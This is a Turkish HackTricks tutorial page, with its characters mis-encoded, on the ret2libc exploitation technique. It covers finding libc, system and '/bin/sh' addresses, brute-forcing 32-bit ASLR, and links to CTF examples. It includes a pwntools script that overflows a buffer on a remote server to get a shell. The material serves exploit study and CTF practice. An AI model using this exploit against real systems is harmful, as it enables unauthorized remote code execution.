# Ret2lib

{% hint style="success" %}
AWS Hacking'Ä± Ã¶ÄŸrenin ve uygulayÄ±n: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks EÄŸitimi AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'Ä± Ã¶ÄŸrenin ve uygulayÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks EÄŸitimi GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'Ä± Destekleyin</summary>

* [**Abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katÄ±lÄ±n veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ± paylaÅŸarak PR gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>
{% endhint %}

## **Temel Bilgiler**

**Ret2Libc**'nin Ã¶zÃ¼, zayÄ±f bir programÄ±n yÃ¼rÃ¼tme akÄ±ÅŸÄ±nÄ±, saldÄ±rgan tarafÄ±ndan saÄŸlanan shellcode'Ä±n yÄ±ÄŸÄ±nda yÃ¼rÃ¼tÃ¼lmesi yerine, paylaÅŸÄ±lan bir kÃ¼tÃ¼phane iÃ§indeki bir iÅŸlevine yÃ¶nlendirmektir (Ã¶rneÄŸin, **system**, **execve**, **strcpy**). SaldÄ±rgan, geri dÃ¶nÃ¼ÅŸ adresini deÄŸiÅŸtiren bir yÃ¼k oluÅŸturur ve yÄ±ÄŸÄ±nda istenen kÃ¼tÃ¼phane iÅŸlevine iÅŸaret ederken, aynÄ± zamanda Ã§aÄŸrÄ± konvansiyonuna gÃ¶re doÄŸru ÅŸekilde ayarlanmÄ±ÅŸ herhangi gerekli argÃ¼manÄ±n da olmasÄ±nÄ± saÄŸlar.

### **Ã–rnek AdÄ±mlar (basitleÅŸtirilmiÅŸ)**

* Ã‡aÄŸrÄ±lacak iÅŸlevin adresini alÄ±n (Ã¶rneÄŸin, system) ve Ã§aÄŸrÄ±lacak komutu (Ã¶rneÄŸin, /bin/sh)
* Ä°lk argÃ¼manÄ± komut dizinine iÅŸaret edecek ÅŸekilde ve yÃ¼rÃ¼tme akÄ±ÅŸÄ±nÄ± iÅŸleve geÃ§irecek ÅŸekilde ROP zinciri oluÅŸturun

## Adresleri Bulma

* KullanÄ±lan `libc`'nin mevcut makineden olanÄ±n nerede bellekte yÃ¼kleneceÄŸini aÅŸaÄŸÄ±daki komutla bulabilirsiniz:

{% code overflow="wrap" %}
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
{% endcode %}

EÄŸer ASLR'Ä±n libc adresini deÄŸiÅŸtirip deÄŸiÅŸtirmediÄŸini kontrol etmek istiyorsanÄ±z ÅŸunu yapabilirsiniz:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
* KullanÄ±lan libc bilindiÄŸinde, `system` iÅŸlevine olan ofseti bulmak da mÃ¼mkÃ¼ndÃ¼r:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
* KullanÄ±lan libc bilindiÄŸinde, `/bin/sh` dizesinin iÅŸlevine olan ofseti bulmak da mÃ¼mkÃ¼ndÃ¼r:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### gdb-peda / GEF KullanÄ±mÄ±

KullanÄ±lan libc bilindiÄŸinde, **system** fonksiyonunun, **exit** fonksiyonunun ve **`/bin/sh`** dizesinin adresini almak iÃ§in Peda veya GEF kullanmak da mÃ¼mkÃ¼ndÃ¼r:
```bash
p system
p exit
find "/bin/sh"
```
### /proc/\<PID>/maps KullanÄ±mÄ±

EÄŸer iÅŸlem her seferinde sizinle iletiÅŸim kurduÄŸunda (**network server**), o dosyayÄ± **okumaya** Ã§alÄ±ÅŸÄ±n (muhtemelen root olmanÄ±z gerekecektir).

Burada iÅŸlem iÃ§inde **libc'nin tam olarak nerede yÃ¼klendiÄŸini** ve iÅŸlemin her Ã§ocuÄŸu iÃ§in **nerede yÃ¼kleneceÄŸini** bulabilirsiniz.

![](<../../../.gitbook/assets/image (853).png>)

Bu durumda **0xb75dc000** adresine yÃ¼klendi (Bu, libc'nin taban adresi olacaktÄ±r)

## Bilinmeyen libc

Binary'nin yÃ¼klediÄŸi libc'yi **bilmediÄŸiniz** olabilir (Ã§Ã¼nkÃ¼ eriÅŸiminiz olmayan bir sunucuda olabilir). Bu durumda, zafiyeti **bazÄ± adresleri sÄ±zdÄ±rarak ve hangi libc** kÃ¼tÃ¼phanesinin kullanÄ±ldÄ±ÄŸÄ±nÄ± bulabilirsiniz:

{% content-ref url="rop-leaking-libc-address/" %}
[rop-leaking-libc-address](rop-leaking-libc-address/)
{% endcontent-ref %}

Ve bunun iÃ§in bir pwntools ÅŸablonunu ÅŸurada bulabilirsiniz:

{% content-ref url="rop-leaking-libc-address/rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-address/rop-leaking-libc-template.md)
{% endcontent-ref %}

### 2 ofset ile libc'yi bilmek

[https://libc.blukat.me/](https://libc.blukat.me/) sayfasÄ±nÄ± kontrol edin ve libc iÃ§indeki fonksiyonlarÄ±n **bir Ã§ift adresini** kullanarak **kullanÄ±lan sÃ¼rÃ¼mÃ¼** bulun.

## 32 bit ASLR'yi atlatma

Bu kaba kuvvet saldÄ±rÄ±larÄ± **yalnÄ±zca 32 bit sistemler** iÃ§in kullanÄ±ÅŸlÄ±dÄ±r.

* SaldÄ±rÄ± yerel ise, libc'nin taban adresini kaba kuvvetle deneyebilirsiniz (32 bit sistemler iÃ§in kullanÄ±ÅŸlÄ±dÄ±r):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* Uzak bir sunucuyu hedef alÄ±yorsanÄ±z, `libc` fonksiyonu `usleep`'in adresini **10** (Ã¶rneÄŸin) argÃ¼manÄ± olarak geÃ§erek **brute-force** yÃ¶ntemini deneyebilirsiniz. EÄŸer sunucu cevap vermek iÃ§in **10 saniye daha fazla zaman alÄ±yorsa**, bu fonksiyonun adresini buldunuz demektir.

## Tek Gadget

YalnÄ±zca **bir** belirli **adrese** atlayarak bir kabuk Ã§alÄ±ÅŸtÄ±rÄ±n libc iÃ§inde:

{% content-ref url="one-gadget.md" %}
[one-gadget.md](one-gadget.md)
{% endcontent-ref %}

## x86 Ret2lib Kod Ã–rneÄŸi

Bu Ã¶rnekte ASLR brute-force kod iÃ§ine entegre edilmiÅŸ ve zafiyetli ikili dosya uzak bir sunucuda bulunmaktadÄ±r:
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## x64 Ret2lib Kod Ã–rneÄŸi

Ã–rneÄŸi kontrol etmek iÃ§in:

{% content-ref url="../" %}
[..](../)
{% endcontent-ref %}

## ARM64 Ret2lib Ã–rneÄŸi

ARM64 durumunda, ret komutu x30 kaydÄ±nÄ±n iÅŸaret ettiÄŸi yere atlar ve yÄ±ÄŸÄ±n kaydÄ±nÄ±n iÅŸaret ettiÄŸi yere deÄŸil. Bu nedenle biraz daha karmaÅŸÄ±ktÄ±r.

AyrÄ±ca ARM64'te bir komut, ne yapmasÄ± gerekiyorsa onu yapar (komutlarÄ±n ortasÄ±na atlayÄ±p onlarÄ± yeni komutlara dÃ¶nÃ¼ÅŸtÃ¼rmek mÃ¼mkÃ¼n deÄŸildir).

Ã–rneÄŸi kontrol etmek iÃ§in:

{% content-ref url="ret2lib-+-printf-leak-arm64.md" %}
[ret2lib-+-printf-leak-arm64.md](ret2lib-+-printf-leak-arm64.md)
{% endcontent-ref %}

## Printf'e Ret

Bu, `printf`/`puts`'Ä± belirli bir veriyle bir argÃ¼man olarak Ã§aÄŸÄ±rarak iÅŸlemdeki bilgileri sÄ±zdÄ±rmayÄ± saÄŸlar. Ã–rneÄŸin, GOT'taki `puts` adresini bir `puts` Ã§alÄ±ÅŸtÄ±rmasÄ±na yerleÅŸtirmek, bellekteki `puts` adresini sÄ±zdÄ±racaktÄ±r.

## Ret2printf

Bu temelde bir `Ret2lib`'i `printf` format dizesi aÃ§Ä±ÄŸÄ±na dÃ¶nÃ¼ÅŸtÃ¼rmek iÃ§in `ret2lib`'i kullanarak `printf`'i Ã§aÄŸÄ±rmak ve sÃ¶mÃ¼rmek iÃ§in deÄŸerlerle kullanmaktÄ±r (anlamsÄ±z gibi gÃ¶rÃ¼nse de mÃ¼mkÃ¼ndÃ¼r):

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

## DiÄŸer Ã–rnekler ve Referanslar

* [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)
* Ret2lib, libc'teki bir iÅŸlevin adresine sÄ±zÄ±ntÄ± verildiÄŸinde, tek bir araÃ§ kullanarak
* [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)
* 64 bit, ASLR etkin ancak PIE yok, ilk adÄ±m bir taÅŸma oluÅŸturup canary'nin 0x00 baytÄ±na kadar doldurmak ve ardÄ±ndan puts'u Ã§aÄŸÄ±rÄ±p sÄ±zdÄ±rmaktÄ±r. Canary ile puts'un GOT'tan adresini sÄ±zdÄ±rmak iÃ§in bir ROP aracÄ± oluÅŸturulur ve ardÄ±ndan `/bin/sh` adresiyle `system('/bin/sh')` Ã§aÄŸÄ±rmak iÃ§in bir ROP aracÄ± oluÅŸturulur.
* [https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html)
* 64 bit, ASLR etkin, canary yok, ana fonksiyonda bir Ã§ocuk fonksiyondan yÄ±ÄŸÄ±n taÅŸmasÄ±. Puts'u Ã§aÄŸÄ±rmak iÃ§in ROP aracÄ± oluÅŸturup GOT'tan puts'un adresini sÄ±zdÄ±rmak ve ardÄ±ndan bir araÃ§ Ã§aÄŸÄ±rmak.
* [https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html)
* 64 bit, pie yok, canary yok, relro yok, nx. Write iÅŸlevini kullanarak write'un adresini (libc) sÄ±zdÄ±rmak ve tek bir araÃ§ Ã§aÄŸÄ±rmak iÃ§in kullanÄ±r.
* [https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html)
* YÄ±ÄŸÄ±n Ã¼zerinden canary'yi sÄ±zdÄ±rmak iÃ§in bir format dizesi kullanÄ±r ve sistem Ã§aÄŸrÄ±sÄ±na (GOT'ta) `/bin/sh` adresiyle birlikte bir taÅŸma oluÅŸturmak iÃ§in bir aÅŸÄ±rÄ± taÅŸma kullanÄ±r.
* [https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html)
* 32 bit, relro yok, canary yok, nx, pie. Bir kÃ¶tÃ¼ dizinlemeyi kÃ¶tÃ¼ye kullanarak yÄ±ÄŸÄ±ndan libc ve heap adreslerini sÄ±zdÄ±rmak. Bir taÅŸma oluÅŸturmak iÃ§in bir ROP aracÄ± kullanarak `system('/bin/sh')` Ã§aÄŸrÄ±sÄ± yapar (bir kontrolÃ¼ atlamak iÃ§in heap adresine ihtiyaÃ§ vardÄ±r).
